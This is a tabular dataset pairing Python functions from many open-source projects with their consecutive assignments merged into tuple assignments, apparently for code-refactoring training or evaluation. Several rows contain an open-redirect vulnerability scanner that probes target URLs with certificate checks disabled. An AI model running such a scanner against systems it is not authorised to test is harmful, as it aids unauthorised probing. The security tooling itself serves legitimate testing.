        self.assertEqual(len(attachments), 3)
        self.assertEqual(attachments[0][""type""], ""text/plain"")
        self.assertEqual(attachments[0][""name""], ""test.txt"")
        self.assertEqual(decode_att(attachments[0][""content""]).decode('ascii'), text_content)
        self.assertEqual(attachments[1][""type""], ""image/png"")  # inferred from filename
        self.assertEqual(attachments[1][""name""], ""test.png"")
        self.assertEqual(decode_att(attachments[1][""content""]), png_content)
        self.assertEqual(attachments[2][""type""], ""application/pdf"")
        self.assertEqual(attachments[2][""name""], """")  # none
        self.assertEqual(decode_att(attachments[2][""content""]), pdf_content)
        # Make sure the image attachment is not treated as embedded:
        self.assertFalse('images' in data['message'])","pdf_content = b'PDF\xb4 pretend this is valid pdf data'
mimeattachment = MIMEBase('application', 'pdf')","pdf_content , mimeattachment  = b'PDF\xb4 pretend this is valid pdf data', MIMEBase('application', 'pdf')"
satpy,https://github.com/pytroll/satpy/tree/master/satpy/readers/yaml_reader.py,,_set_orientation$979,"def _set_orientation(dataset, upper_right_corner):
    """"""Set the orientation of geostationary datasets.

    Allows to flip geostationary imagery when loading the datasets.
    Example call: scn.load(['VIS008'], upper_right_corner='NE')

    Args:
        dataset: Dataset to be flipped.
        upper_right_corner (str): Direction of the upper right corner of the image after flipping.
                                Possible options are 'NW', 'NE', 'SW', 'SE', or 'native'.
                                The common upright image orientation corresponds to 'NE'.
                                Defaults to 'native' (no flipping is applied).

    """"""
    # do some checks and early returns
    if upper_right_corner == 'native':
        logger.debug(""Requested orientation for Dataset {} is 'native' (default). ""
                     ""No flipping is applied."".format(dataset.attrs.get('name')))
        return dataset

    if upper_right_corner not in ['NW', 'NE', 'SE', 'SW', 'native']:
        raise ValueError(""Target orientation for Dataset {} not recognized. ""
                         ""Kwarg upper_right_corner should be ""
                         ""'NW', 'NE', 'SW', 'SE' or 'native'."".format(dataset.attrs.get('name', 'unknown_name')))

    if 'area' not in dataset.attrs:
        logger.info(""Dataset {} is missing the area attribute ""
                    ""and will not be flipped."".format(dataset.attrs.get('name', 'unknown_name')))
        return dataset

    if isinstance(dataset.attrs['area'], SwathDefinition):
        logger.info(""Dataset {} is in a SwathDefinition ""
                    ""and will not be flipped."".format(dataset.attrs.get('name', 'unknown_name')))
        return dataset

    projection_type = _get_projection_type(dataset.attrs['area'])
    accepted_geos_proj_types = ['Geostationary Satellite (Sweep Y)', 'Geostationary Satellite (Sweep X)']
    if projection_type not in accepted_geos_proj_types:
        logger.info(""Dataset {} is not in one of the known geostationary projections {} ""
                    ""and cannot be flipped."".format(dataset.attrs.get('name', 'unknown_name'),
                                                    accepted_geos_proj_types))
        return dataset

    target_eastright, target_northup = _get_target_scene_orientation(upper_right_corner)

    area_extents_to_update = _get_dataset_area_extents_array(dataset.attrs['area'])
    current_eastright, current_northup = _get_current_scene_orientation(area_extents_to_update)

    if target_northup == current_northup and target_eastright == current_eastright:
        logger.info(""Dataset {} is already in the target orientation ""
                    ""and will not be flipped."".format(dataset.attrs.get('name', 'unknown_name')))
        return dataset

    if target_northup != current_northup:
        dataset, area_extents_to_update = _flip_dataset_data_and_area_extents(dataset, area_extents_to_update,
                                                                              'upsidedown')
    if target_eastright != current_eastright:
        dataset, area_extents_to_update = _flip_dataset_data_and_area_extents(dataset, area_extents_to_update,
                                                                              'leftright')

    dataset.attrs['area'] = _get_new_flipped_area_definition(dataset.attrs['area'], area_extents_to_update,
                                                             flip_areadef_stacking=target_northup != current_northup)

    return dataset","projection_type = _get_projection_type(dataset.attrs['area'])
accepted_geos_proj_types = ['Geostationary Satellite (Sweep Y)', 'Geostationary Satellite (Sweep X)']","projection_type , accepted_geos_proj_types  = _get_projection_type(dataset.attrs['area']), ['Geostationary Satellite (Sweep Y)', 'Geostationary Satellite (Sweep X)']"
audio,https://github.com/pytorch/audio/tree/master/test/torchaudio_unittest/backend/sox_io/smoke_test.py,SmokeTest,run_smoke_test$22,"def run_smoke_test(self, ext, sample_rate, num_channels, *, compression=None, dtype=""float32""):
        duration = 1
        num_frames = sample_rate * duration
        path = self.get_temp_path(f""test.{ext}"")
        original = get_wav_data(dtype, num_channels, normalize=False, num_frames=num_frames)

        # 1. run save
        sox_io_backend.save(path, original, sample_rate, compression=compression)
        # 2. run info
        info = sox_io_backend.info(path)
        assert info.sample_rate == sample_rate
        assert info.num_channels == num_channels
        # 3. run load
        loaded, sr = sox_io_backend.load(path, normalize=False)
        assert sr == sample_rate
        assert loaded.shape[0] == num_channels","path = self.get_temp_path(f'test.{ext}')
original = get_wav_data(dtype, num_channels, normalize=False, num_frames=num_frames)","path , original  = self.get_temp_path(f'test.{ext}'), get_wav_data(dtype, num_channels, normalize=False, num_frames=num_frames)"
wasp-os,https://github.com/daniel-thompson/wasp-os/tree/master/wasp/ppg.py,Biquad,step$45,"def step(self, x):
        c = self._coeff
        v1 = self._v1
        v2 = self._v2

        v = x - (c[3] * v1) - (c[4] * v2)
        y = (c[0] * v) + (c[1] * v1) + (c[2] * v2)

        self._v2 = v1
        self._v1 = v
        return y","c = self._coeff
v1 = self._v1
v2 = self._v2","c , v1 , v2  = self._coeff, self._v1, self._v2"
wasp-os,https://github.com/daniel-thompson/wasp-os/tree/master/wasp/ppg.py,Biquad,step$45,"def step(self, x):
        c = self._coeff
        v1 = self._v1
        v2 = self._v2

        v = x - (c[3] * v1) - (c[4] * v2)
        y = (c[0] * v) + (c[1] * v1) + (c[2] * v2)

        self._v2 = v1
        self._v1 = v
        return y","y = c[0] * v + c[1] * v1 + c[2] * v2
self._v2 = v1
self._v1 = v","y , self._v2 , self._v1  = c[0] * v + c[1] * v1 + c[2] * v2, v1, v"
checkmk,https://github.com/tribe29/checkmk/tree/master/agents/wnx/test_files/config_files/mk_logwatch.py,LogLinesIter,skip_remaining$512,"def skip_remaining(self):
        os.lseek(self._fd, 0, os.SEEK_END)
        self._buffer = b''
        self._lines = []","self._buffer = b''
self._lines = []","self._buffer , self._lines  = b'', []"
sympy,https://github.com/sympy/sympy/tree/master/sympy/simplify/tests/test_radsimp.py,,test_collect_Wild$320,"def test_collect_Wild():
    """"""Collect with respect to functions with Wild argument""""""
    a, b, x, y = symbols('a b x y')
    f = Function('f')
    w1 = Wild('.1')
    w2 = Wild('.2')
    assert collect(f(x) + a*f(x), f(w1)) == (1 + a)*f(x)
    assert collect(f(x, y) + a*f(x, y), f(w1)) == f(x, y) + a*f(x, y)
    assert collect(f(x, y) + a*f(x, y), f(w1, w2)) == (1 + a)*f(x, y)
    assert collect(f(x, y) + a*f(x, y), f(w1, w1)) == f(x, y) + a*f(x, y)
    assert collect(f(x, x) + a*f(x, x), f(w1, w1)) == (1 + a)*f(x, x)
    assert collect(a*(x + 1)**y + (x + 1)**y, w1**y) == (1 + a)*(x + 1)**y
    assert collect(a*(x + 1)**y + (x + 1)**y, w1**b) == \
        a*(x + 1)**y + (x + 1)**y
    assert collect(a*(x + 1)**y + (x + 1)**y, (x + 1)**w2) == \
        (1 + a)*(x + 1)**y
    assert collect(a*(x + 1)**y + (x + 1)**y, w1**w2) == (1 + a)*(x + 1)**y","f = Function('f')
w1 = Wild('.1')
w2 = Wild('.2')","f , w1 , w2  = Function('f'), Wild('.1'), Wild('.2')"
open_model_zoo,https://github.com/openvinotoolkit/open_model_zoo/tree/master/demos/place_recognition_demo/python/place_recognition_demo.py,,time_elapsed$81,"def time_elapsed(func, *args):
    """""" Auxiliary function that helps to measure elapsed time. """"""

    start_time = perf_counter()
    res = func(*args)
    elapsed = perf_counter() - start_time
    return elapsed, res","res = func(*args)
elapsed = perf_counter() - start_time","res , elapsed  = func(*args), perf_counter() - start_time"
pgadmin4,https://github.com/postgres/pgadmin4/tree/master/web/pgadmin/browser/utils.py,PGChildModule,__init__$107,"def __init__(self, *args, **kwargs):
        self.min_ver = 0
        self.max_ver = 1100000000
        self.min_ppasver = 0
        self.max_ppasver = 1100000000
        self.server_type = None

        super().__init__()","self.min_ver = 0
self.max_ver = 1100000000
self.min_ppasver = 0
self.max_ppasver = 1100000000
self.server_type = None","self.min_ver , self.max_ver , self.min_ppasver , self.max_ppasver , self.server_type  = 0, 1100000000, 0, 1100000000, None"
torchdrug,https://github.com/DeepGraphLearning/torchdrug/tree/master/torchdrug/layers/conv.py,ChebyshevConv,__init__$688,"def __init__(self, input_dim, output_dim, edge_input_dim=None, k=1, batch_norm=False, activation=""relu""):
        super(ChebyshevConv, self).__init__()
        self.input_dim = input_dim
        self.output_dim = output_dim
        self.k = k
        self.edge_input_dim = edge_input_dim

        if batch_norm:
            self.batch_norm = nn.BatchNorm1d(output_dim)
        else:
            self.batch_norm = None
        if isinstance(activation, str):
            self.activation = getattr(F, activation)
        else:
            self.activation = activation

        self.linear = nn.Linear((k + 1) * input_dim, output_dim)
        if edge_input_dim:
            self.edge_linear = nn.Linear(edge_input_dim, input_dim)
        else:
            self.edge_linear = None","self.input_dim = input_dim
self.output_dim = output_dim
self.k = k
self.edge_input_dim = edge_input_dim","self.input_dim , self.output_dim , self.k , self.edge_input_dim  = input_dim, output_dim, k, edge_input_dim"
Deep-Learning,https://github.com/Jack-Cherish/Deep-Learning/tree/master/Pytorch-Seg/lesson-3/log.py,Logger,__init__$4,"def __init__(self, filename=""log.txt""):
        self.terminal = sys.stdout
        self.log = open(filename, ""w"")","self.terminal = sys.stdout
self.log = open(filename, 'w')","self.terminal , self.log  = sys.stdout, open(filename, 'w')"
ROMP,https://github.com/Arthur151/ROMP/tree/master/romp/lib/evaluation/collect_VIBE_3DPW_results.py,Submit,__init__$16,"def __init__(self):
        super(Submit, self).__init__()
        self.evaluation_mode = 'nottracking'
        self.output_dir = '/export/home/suny/results/'
        self.results_dir = os.path.join(self.output_dir,'VIBE_3DPW_results')
        self.ds_root_dir = ""/export/home/suny/dataset/3DPW/sequenceFiles/""
        self.project_dir = '/export/home/suny/CenterMesh/'
        self.set_parent_tree()
        self.collect_3DPW_layout()
        save_dir = os.path.join(self.output_dir, '多人notrack-VIBE')#""多人{}-VIBE-retracking"".format(self.evaluation_mode)) # 取对应人数结果-取第一结果填补
        self.eval_code_dir = os.path.join(os.path.join(self.project_dir,'src/evaluation'))
        print('Initialization finished!')

        self.joint_regressor = torch.from_numpy(csr_matrix.toarray(self.read_pickle(os.path.join(self.project_dir,'models/smpl_original/basicModel_f_lbs_10_207_0_v1.0.0.pkl'))['J_regressor'])).float().T

        self.eval_HC()
        #if 1:#not os.path.exists(os.path.join(save_dir, 'results.zip')):
        if self.evaluation_mode == 'tracking':
            self.get_results()
        else:
            self.results_matched_to_gt_bbox()
        params_results = self.pack_results(save_dir)

        self.eval_pve(save_dir, params_results)
        self.run_official_evaluation(save_dir)","self.evaluation_mode = 'nottracking'
self.output_dir = '/export/home/suny/results/'","self.evaluation_mode , self.output_dir  = 'nottracking', '/export/home/suny/results/'"
ROMP,https://github.com/Arthur151/ROMP/tree/master/romp/lib/evaluation/collect_VIBE_3DPW_results.py,Submit,__init__$16,"def __init__(self):
        super(Submit, self).__init__()
        self.evaluation_mode = 'nottracking'
        self.output_dir = '/export/home/suny/results/'
        self.results_dir = os.path.join(self.output_dir,'VIBE_3DPW_results')
        self.ds_root_dir = ""/export/home/suny/dataset/3DPW/sequenceFiles/""
        self.project_dir = '/export/home/suny/CenterMesh/'
        self.set_parent_tree()
        self.collect_3DPW_layout()
        save_dir = os.path.join(self.output_dir, '多人notrack-VIBE')#""多人{}-VIBE-retracking"".format(self.evaluation_mode)) # 取对应人数结果-取第一结果填补
        self.eval_code_dir = os.path.join(os.path.join(self.project_dir,'src/evaluation'))
        print('Initialization finished!')

        self.joint_regressor = torch.from_numpy(csr_matrix.toarray(self.read_pickle(os.path.join(self.project_dir,'models/smpl_original/basicModel_f_lbs_10_207_0_v1.0.0.pkl'))['J_regressor'])).float().T

        self.eval_HC()
        #if 1:#not os.path.exists(os.path.join(save_dir, 'results.zip')):
        if self.evaluation_mode == 'tracking':
            self.get_results()
        else:
            self.results_matched_to_gt_bbox()
        params_results = self.pack_results(save_dir)

        self.eval_pve(save_dir, params_results)
        self.run_official_evaluation(save_dir)","self.results_dir = os.path.join(self.output_dir, 'VIBE_3DPW_results')
self.ds_root_dir = '/export/home/suny/dataset/3DPW/sequenceFiles/'
self.project_dir = '/export/home/suny/CenterMesh/'","self.results_dir , self.ds_root_dir , self.project_dir  = os.path.join(self.output_dir, 'VIBE_3DPW_results'), '/export/home/suny/dataset/3DPW/sequenceFiles/', '/export/home/suny/CenterMesh/'"
ROMP,https://github.com/Arthur151/ROMP/tree/master/romp/lib/evaluation/collect_VIBE_3DPW_results.py,Submit,__init__$16,"def __init__(self):
        super(Submit, self).__init__()
        self.evaluation_mode = 'nottracking'
        self.output_dir = '/export/home/suny/results/'
        self.results_dir = os.path.join(self.output_dir,'VIBE_3DPW_results')
        self.ds_root_dir = ""/export/home/suny/dataset/3DPW/sequenceFiles/""
        self.project_dir = '/export/home/suny/CenterMesh/'
        self.set_parent_tree()
        self.collect_3DPW_layout()
        save_dir = os.path.join(self.output_dir, '多人notrack-VIBE')#""多人{}-VIBE-retracking"".format(self.evaluation_mode)) # 取对应人数结果-取第一结果填补
        self.eval_code_dir = os.path.join(os.path.join(self.project_dir,'src/evaluation'))
        print('Initialization finished!')

        self.joint_regressor = torch.from_numpy(csr_matrix.toarray(self.read_pickle(os.path.join(self.project_dir,'models/smpl_original/basicModel_f_lbs_10_207_0_v1.0.0.pkl'))['J_regressor'])).float().T

        self.eval_HC()
        #if 1:#not os.path.exists(os.path.join(save_dir, 'results.zip')):
        if self.evaluation_mode == 'tracking':
            self.get_results()
        else:
            self.results_matched_to_gt_bbox()
        params_results = self.pack_results(save_dir)

        self.eval_pve(save_dir, params_results)
        self.run_official_evaluation(save_dir)","save_dir = os.path.join(self.output_dir, '多人notrack-VIBE')
self.eval_code_dir = os.path.join(os.path.join(self.project_dir, 'src/evaluation'))","save_dir , self.eval_code_dir  = os.path.join(self.output_dir, '多人notrack-VIBE'), os.path.join(os.path.join(self.project_dir, 'src/evaluation'))"
mobile-vision,https://github.com/facebookresearch/mobile-vision/tree/master/mobile_cv/arch/fbnet_v2/basic_blocks.py,Upsample,__repr__$687,"def __repr__(self):
        ret = []
        attr_list = [""size"", ""scale"", ""mode"", ""align_corners""]
        for x in attr_list:
            val = getattr(self, x, None)
            if val is not None:
                ret.append(f""{x}={val}"")
        return f""Upsample({', '.join(ret)})""","ret = []
attr_list = ['size', 'scale', 'mode', 'align_corners']","ret , attr_list  = [], ['size', 'scale', 'mode', 'align_corners']"
python,https://github.com/zhanghe06/python/tree/master/kubernetes/client/models/v1_affinity.py,V1Affinity,__init__$47,"def __init__(self, node_affinity=None, pod_affinity=None, pod_anti_affinity=None, local_vars_configuration=None):  # noqa: E501
        """"""V1Affinity - a model defined in OpenAPI""""""  # noqa: E501
        if local_vars_configuration is None:
            local_vars_configuration = Configuration()
        self.local_vars_configuration = local_vars_configuration

        self._node_affinity = None
        self._pod_affinity = None
        self._pod_anti_affinity = None
        self.discriminator = None

        if node_affinity is not None:
            self.node_affinity = node_affinity
        if pod_affinity is not None:
            self.pod_affinity = pod_affinity
        if pod_anti_affinity is not None:
            self.pod_anti_affinity = pod_anti_affinity","self.local_vars_configuration = local_vars_configuration
self._node_affinity = None
self._pod_affinity = None
self._pod_anti_affinity = None
self.discriminator = None","self.local_vars_configuration , self._node_affinity , self._pod_affinity , self._pod_anti_affinity , self.discriminator  = local_vars_configuration, None, None, None, None"
plaso,https://github.com/log2timeline/plaso/tree/master/tests/cli/pinfo_tool.py,PinfoToolTest,testGenerateReportHeaderAsText$374,"def testGenerateReportHeaderAsText(self):
    """"""Tests the _GenerateReportHeader function.""""""
    output_writer = test_lib.TestOutputWriter(encoding='utf-8')
    test_tool = pinfo_tool.PinfoTool(output_writer=output_writer)
    test_tool._output_format = 'text'

    column_titles = ['Search engine', 'Search term', 'Number of queries']
    test_tool._GenerateReportHeader('browser_searches', column_titles)

    expected_output = [
        'Search engine\tSearch term\tNumber of queries',
        '']

    output = output_writer.ReadOutput()

    # Compare the output as list of lines which makes it easier to spot
    # differences.
    self.assertEqual(output.split('\n'), expected_output)","test_tool._output_format = 'text'
column_titles = ['Search engine', 'Search term', 'Number of queries']","test_tool._output_format , column_titles  = 'text', ['Search engine', 'Search term', 'Number of queries']"
plaso,https://github.com/log2timeline/plaso/tree/master/tests/cli/pinfo_tool.py,PinfoToolTest,testGenerateReportHeaderAsText$374,"def testGenerateReportHeaderAsText(self):
    """"""Tests the _GenerateReportHeader function.""""""
    output_writer = test_lib.TestOutputWriter(encoding='utf-8')
    test_tool = pinfo_tool.PinfoTool(output_writer=output_writer)
    test_tool._output_format = 'text'

    column_titles = ['Search engine', 'Search term', 'Number of queries']
    test_tool._GenerateReportHeader('browser_searches', column_titles)

    expected_output = [
        'Search engine\tSearch term\tNumber of queries',
        '']

    output = output_writer.ReadOutput()

    # Compare the output as list of lines which makes it easier to spot
    # differences.
    self.assertEqual(output.split('\n'), expected_output)","expected_output = ['Search engine\tSearch term\tNumber of queries', '']
output = output_writer.ReadOutput()","expected_output , output  = ['Search engine\tSearch term\tNumber of queries', ''], output_writer.ReadOutput()"
pentest-tools,https://github.com/gwen001/pentest-tools/tree/master//openredirect.py,,realDoTest$157,"def realDoTest( t_params ):

    url = t_params[0]
    method = t_params[1]
    post_params = t_params[2]

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc

    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= MAX_EXCEPTION:
        if _verbose >= 3:
            print(""skip too many exceptions %s"" % t_urlparse.netloc)
        return

    if not u in t_vulnerable:
        t_vulnerable[u] = 0
    if t_vulnerable[u] >= MAX_VULNERABLE:
        if _verbose >= 3:
            print(""skip already vulnerable %s"" % t_urlparse.netloc)
        return

    try:
        if method == 'POST':
            r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False, allow_redirects=True )
        else:
            r = requests.head( url, timeout=5, headers=t_custom_headers, verify=False, allow_redirects=True )
    except Exception as e:
        # t_exceptions[u] = t_exceptions[u] + 1
        if _verbose >= 3:
            sys.stdout.write( ""%s[-] error occurred: %s%s\n"" % (fg('red'),e,attr(0)) )
        return

    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'

    vuln = '-'
    t_url_parse = urlparse( r.url )
    for domain in t_redirect_domain:
        if domain in t_url_parse.netloc.lower():
            vuln = 'VULNERABLE'

    if vuln == '-':
        for redirect_url in t_redirect_urls:
            if r.url.lower().startswith(redirect_url):
                vuln = 'VULNERABLE'

    if vuln == 'VULNERABLE':
        t_vulnerable[u] = t_vulnerable[u] + 1

    # output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
        if vuln == 'VULNERABLE':
            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
        else:
            sys.stdout.write( output )","url = t_params[0]
method = t_params[1]
post_params = t_params[2]","url , method , post_params  = t_params[0], t_params[1], t_params[2]"
pentest-tools,https://github.com/gwen001/pentest-tools/tree/master//openredirect.py,,realDoTest$157,"def realDoTest( t_params ):

    url = t_params[0]
    method = t_params[1]
    post_params = t_params[2]

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc

    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= MAX_EXCEPTION:
        if _verbose >= 3:
            print(""skip too many exceptions %s"" % t_urlparse.netloc)
        return

    if not u in t_vulnerable:
        t_vulnerable[u] = 0
    if t_vulnerable[u] >= MAX_VULNERABLE:
        if _verbose >= 3:
            print(""skip already vulnerable %s"" % t_urlparse.netloc)
        return

    try:
        if method == 'POST':
            r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False, allow_redirects=True )
        else:
            r = requests.head( url, timeout=5, headers=t_custom_headers, verify=False, allow_redirects=True )
    except Exception as e:
        # t_exceptions[u] = t_exceptions[u] + 1
        if _verbose >= 3:
            sys.stdout.write( ""%s[-] error occurred: %s%s\n"" % (fg('red'),e,attr(0)) )
        return

    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'

    vuln = '-'
    t_url_parse = urlparse( r.url )
    for domain in t_redirect_domain:
        if domain in t_url_parse.netloc.lower():
            vuln = 'VULNERABLE'

    if vuln == '-':
        for redirect_url in t_redirect_urls:
            if r.url.lower().startswith(redirect_url):
                vuln = 'VULNERABLE'

    if vuln == 'VULNERABLE':
        t_vulnerable[u] = t_vulnerable[u] + 1

    # output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
        if vuln == 'VULNERABLE':
            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
        else:
            sys.stdout.write( output )","vuln = '-'
t_url_parse = urlparse(r.url)","vuln , t_url_parse  = '-', urlparse(r.url)"
pentest-tools,https://github.com/gwen001/pentest-tools/tree/master//openredirect.py,,realDoTest$157,"def realDoTest( t_params ):

    url = t_params[0]
    method = t_params[1]
    post_params = t_params[2]

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc

    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= MAX_EXCEPTION:
        if _verbose >= 3:
            print(""skip too many exceptions %s"" % t_urlparse.netloc)
        return

    if not u in t_vulnerable:
        t_vulnerable[u] = 0
    if t_vulnerable[u] >= MAX_VULNERABLE:
        if _verbose >= 3:
            print(""skip already vulnerable %s"" % t_urlparse.netloc)
        return

    try:
        if method == 'POST':
            r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False, allow_redirects=True )
        else:
            r = requests.head( url, timeout=5, headers=t_custom_headers, verify=False, allow_redirects=True )
    except Exception as e:
        # t_exceptions[u] = t_exceptions[u] + 1
        if _verbose >= 3:
            sys.stdout.write( ""%s[-] error occurred: %s%s\n"" % (fg('red'),e,attr(0)) )
        return

    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'

    vuln = '-'
    t_url_parse = urlparse( r.url )
    for domain in t_redirect_domain:
        if domain in t_url_parse.netloc.lower():
            vuln = 'VULNERABLE'

    if vuln == '-':
        for redirect_url in t_redirect_urls:
            if r.url.lower().startswith(redirect_url):
                vuln = 'VULNERABLE'

    if vuln == 'VULNERABLE':
        t_vulnerable[u] = t_vulnerable[u] + 1

    # output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
        if vuln == 'VULNERABLE':
            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
        else:
            sys.stdout.write( output )","output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' % (url, r.status_code, content_type, vuln)
fp = open(t_multiproc['f_output'], 'a+')","output , fp  = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' % (url, r.status_code, content_type, vuln), open(t_multiproc['f_output'], 'a+')"
YOLOv5-Lite,https://github.com/ppogg/YOLOv5-Lite/tree/master/utils/google_utils.py,,gdrive_download$55,"def gdrive_download(id='16TiPfZj7htmTyhntwcZyEEAejOUxuT6m', file='tmp.zip'):
    # Downloads a file from Google Drive. from yolov5.utils.google_utils import *; gdrive_download()
    t = time.time()
    file = Path(file)
    cookie = Path('cookie')  # gdrive cookie
    print(f'Downloading https://drive.google.com/uc?export=download&id={id} as {file}... ', end='')
    file.unlink(missing_ok=True)  # remove existing file
    cookie.unlink(missing_ok=True)  # remove existing cookie

    # Attempt file download
    out = ""NUL"" if platform.system() == ""Windows"" else ""/dev/null""
    os.system(f'curl -c ./cookie -s -L ""drive.google.com/uc?export=download&id={id}"" > {out}')
    if os.path.exists('cookie'):  # large file
        s = f'curl -Lb ./cookie ""drive.google.com/uc?export=download&confirm={get_token()}&id={id}"" -o {file}'
    else:  # small file
        s = f'curl -s -L -o {file} ""drive.google.com/uc?export=download&id={id}""'
    r = os.system(s)  # execute, capture return
    cookie.unlink(missing_ok=True)  # remove existing cookie

    # Error check
    if r != 0:
        file.unlink(missing_ok=True)  # remove partial
        print('Download error ')  # raise Exception('Download error')
        return r

    # Unzip if archive
    if file.suffix == '.zip':
        print('unzipping... ', end='')
        os.system(f'unzip -q {file}')  # unzip
        file.unlink()  # remove zip to free space

    print(f'Done ({time.time() - t:.1f}s)')
    return r","t = time.time()
file = Path(file)
cookie = Path('cookie')","t , file , cookie  = time.time(), Path(file), Path('cookie')"
slither,https://github.com/crytic/slither/tree/master/slither/solc_parsing/declarations/function.py,FunctionSolc,analyze_params$252,"def analyze_params(self):
        # Can be re-analyzed due to inheritance
        if self._params_was_analyzed:
            return

        self._params_was_analyzed = True

        self._analyze_attributes()

        if self.is_compact_ast:
            params = self._functionNotParsed[""parameters""]
            returns = self._functionNotParsed[""returnParameters""]
        else:
            children = self._functionNotParsed[self.get_children(""children"")]
            # It uses to be
            # params = children[0]
            # returns = children[1]
            # But from Solidity 0.6.3 to 0.6.10 (included)
            # Comment above a function might be added in the children
            child_iter = iter(
                [child for child in children if child[self.get_key()] == ""ParameterList""]
            )
            params = next(child_iter)
            returns = next(child_iter)

        if params:
            self._parse_params(params)
        if returns:
            self._parse_returns(returns)","params = self._functionNotParsed['parameters']
returns = self._functionNotParsed['returnParameters']","params , returns  = self._functionNotParsed['parameters'], self._functionNotParsed['returnParameters']"
dm_control,https://github.com/deepmind/dm_control/tree/master/dm_control/locomotion/arenas/covering_test.py,CoveringTest,testNoOverlappingWalls$57,"def testNoOverlappingWalls(self):
    maze_string = """"""..**
                     .***
                     .***
                     """""".replace(' ', '')
    walls = covering.make_walls(labmaze.TextGrid(maze_string))
    surface = 0
    for wall in walls:
      size_x = wall.end.x - wall.start.x
      size_y = wall.end.y - wall.start.y
      surface += size_x * size_y
    self.assertEqual(surface, 8)","walls = covering.make_walls(labmaze.TextGrid(maze_string))
surface = 0","walls , surface  = covering.make_walls(labmaze.TextGrid(maze_string)), 0"
dm_control,https://github.com/deepmind/dm_control/tree/master/dm_control/locomotion/arenas/covering_test.py,CoveringTest,testNoOverlappingWalls$57,"def testNoOverlappingWalls(self):
    maze_string = """"""..**
                     .***
                     .***
                     """""".replace(' ', '')
    walls = covering.make_walls(labmaze.TextGrid(maze_string))
    surface = 0
    for wall in walls:
      size_x = wall.end.x - wall.start.x
      size_y = wall.end.y - wall.start.y
      surface += size_x * size_y
    self.assertEqual(surface, 8)","size_x = wall.end.x - wall.start.x
size_y = wall.end.y - wall.start.y","size_x , size_y  = wall.end.x - wall.start.x, wall.end.y - wall.start.y"
sentry,https://github.com/getsentry/sentry/tree/master/tests/snuba/sessions/test_sessions.py,CheckNumberOfSessions,setUp$1153,"def setUp(self):
        super().setUp()
        self.dev_env = self.create_environment(name=""development"", project=self.project)
        self.prod_env = self.create_environment(name=""production"", project=self.project)
        self.test_env = self.create_environment(name=""test"", project=self.project)
        self.another_project = self.create_project()
        self.third_project = self.create_project()

        # now_dt should be set to 17:40 of some day not in the future and (system time - now_dt)
        # must be less than 90 days for the metrics DB TTL
        ONE_DAY_AGO = datetime.now(tz=dt_timezone.utc) - timedelta(days=1)
        self.now_dt = ONE_DAY_AGO.replace(hour=17, minute=40, second=0)
        self._5_min_ago_dt = self.now_dt - timedelta(minutes=5)
        self._30_min_ago_dt = self.now_dt - timedelta(minutes=30)
        self._1_h_ago_dt = self.now_dt - timedelta(hours=1)
        self._2_h_ago_dt = self.now_dt - timedelta(hours=2)
        self._3_h_ago_dt = self.now_dt - timedelta(hours=3)

        self.now = self.now_dt.timestamp()
        self._5_min_ago = self._5_min_ago_dt.timestamp()
        self._30_min_ago = self._30_min_ago_dt.timestamp()
        self._1_h_ago = self._1_h_ago_dt.timestamp()
        self._2_h_ago = self._2_h_ago_dt.timestamp()
        self._3_h_ago = self._3_h_ago_dt.timestamp()","self.third_project = self.create_project()
ONE_DAY_AGO = datetime.now(tz=dt_timezone.utc) - timedelta(days=1)","self.third_project , ONE_DAY_AGO  = self.create_project(), datetime.now(tz=dt_timezone.utc) - timedelta(days=1)"
